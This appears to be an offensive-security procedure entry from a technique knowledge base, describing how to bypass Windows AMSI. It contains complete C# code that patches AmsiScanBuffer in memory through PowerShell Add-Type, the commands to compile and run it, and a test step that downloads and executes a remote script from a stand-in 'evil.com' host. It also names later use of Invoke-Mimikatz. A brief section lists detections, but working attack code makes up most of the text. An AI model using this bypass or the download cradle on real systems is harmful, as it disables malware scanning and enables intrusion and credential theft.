---
type: procedure
description: >-
  Bypass Antimalware Scan Interface (AMSI) scanning using reflection to load and
  execute a .NET assembly in PowerShell, combined with WMF5 autologging evasion.
verified: true
submitted: false
created_at: '2023-04-06T03:56:26.137888+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[Defense Evasion]]'
techniques:
  - '[[Disable or Modify Tools]]'
sub_techniques: []
tags:
  - amsi-bypass
  - powershell
  - reflection
  - defense-evasion
  - wmf5
commands:
  - '[[commands/powershell-patch-amsi-reflection]]'
platforms:
  - Windows
tools: []
validated: true
---

# Reflection-Based-AMSI-Bypass-with-WMF5-Autologging

## Summary

This procedure demonstrates a reflection-based technique to bypass AMSI scanning in PowerShell by loading a custom .NET assembly using Add-Type, leveraging WMF5 autologging evasion to avoid script block logging. The assembly patches the AmsiScanBuffer function in amsi.dll via memory modification, allowing execution of otherwise blocked malicious code such as obfuscated payloads or scripts.

## Description

AMSI integrates with PowerShell to scan scripts at runtime for malicious content. This procedure uses Matt Graeber's reflection method to compile and invoke C# code directly in memory, bypassing AMSI without writing files to disk. The WMF5 autologging bypass ensures that the PowerShell session evades module and transcription logging, making detection harder. This is effective on Windows 10+ with PowerShell 5.0 or later, targeting environments where AMSI is enabled (e.g., enterprise endpoints with Defender). The technique achieves defense evasion by altering AMSI's behavior in the current process, enabling subsequent execution of tools like Invoke-Mimikatz or custom shells. It requires administrative privileges or a running PowerShell session with sufficient permissions to load assemblies.

## Requirements

1. PowerShell 5.0 or later (WMF5 installed on Windows 7+ or Server 2008+).
2. Local execution access to a PowerShell session (no network required, but often gained via initial access like phishing).
3. Understanding of .NET reflection, PowerShell execution policies, and memory patching.
4. Target system with AMSI enabled (default on modern Windows).

## Defense

- Enable PowerShell Constrained Language Mode and monitor for Add-Type usage via Event ID 4104 (Script Block Logging).
- Use Sysmon to log process injections and DLL loads (Rule 8 for CreateRemoteThread, Rule 7 for ImageLoad targeting amsi.dll).
- Implement application whitelisting (AppLocker/WDAC) to restrict unsigned assembly loads.
- Regularly audit PowerShell logs for reflection patterns and anomalous Console.WriteLine outputs like "Patch Successful".

## Objectives

1. Disable AMSI scanning in the current PowerShell session to evade script detection.
2. Load and execute a reflective .NET assembly without triggering autologging.
3. Verify the bypass by running a known-blocked command (e.g., obfuscated IEX payload).

## Instructions

### Step 1: Prepare the Reflection Assembly

**Context**: Define the C# code as a here-string in PowerShell to compile an in-memory assembly that patches AMSI. This step uses reflection to avoid file-based logging in WMF5 environments.

**Code** ([[codes/C-Sharp-AMSI-Patch-Via-Reflection]]):

```powershell
$Winpatch = @"
using System;
using System.Runtime.InteropServices;

public class patch
{
    // https://twitter.com/_xpn_/status/1170852932650262530
    static byte[] x64 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    static byte[] x86 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };

    public static void it()
    {
        if (is64Bit())
            PatchAmsi(x64);
        else
            PatchAmsi(x86);
    }

    private static void PatchAmsi(byte[] patch)
    {
        try
        {
            var lib = Win32.LoadLibrary("a" + "ms" + "i.dll");
            var addr = Win32.GetProcAddress(lib, "AmsiScanBuffer");

            uint oldProtect;
            Win32.VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out oldProtect);

            Marshal.Copy(patch, 0, addr, patch.Length);
            Console.WriteLine("Patch Successful");
        }
        catch (Exception e)
        {
            Console.WriteLine(" [x] {0}", e.Message);
            Console.WriteLine(" [x] {0}", e.InnerException);
        }
    }

    private static bool is64Bit()
        {
            bool is64Bit = true;

            if (IntPtr.Size == 4)
                is64Bit = false;

            return is64Bit;
        }
}

class Win32
{
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
```

> This defines the assembly with P/Invoke calls to kernel32 for loading amsi.dll, finding AmsiScanBuffer, changing memory protection, and applying the patch bytes (RET instruction to skip scanning). The architecture (x64/x86) is auto-detected.

### Step 2: Compile and Execute the Patch

**Context**: Compile the C# code into a .NET type using Add-Type, then invoke the patch method. This reflective load evades WMF5 autologging by not triggering full script execution logs.

**Command** ([[commands/powershell-patch-amsi-reflection]]):

```powershell
Add-Type -TypeDefinition $Winpatch -Language CSharp
[patch]::it()
```

> The Add-Type cmdlet compiles the here-string into an assembly loaded in the current AppDomain. Invoking [patch]::it() applies the memory patch. If successful, AMSI will return a clean scan result for malicious content.

### Step 3: Verify the Bypass

**Context**: Test the bypass by executing a command that AMSI would normally block, such as an obfuscated download cradle.

**Instructions**: Run a test payload like:

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')
```

> If the bypass works, the payload executes without AMSI flagging it. Monitor for the "Patch Successful" output from the assembly.

**Expected Output**: Console output: "Patch Successful". No AMSI errors on subsequent malicious script execution.

## Expected Output

- Successful patch: "Patch Successful" printed to console.
- Failed patch: Exception messages like access denied or library load errors.
- Post-bypass test: Malicious scripts run without blocking (e.g., no "Script execution was blocked by AMSI" error).
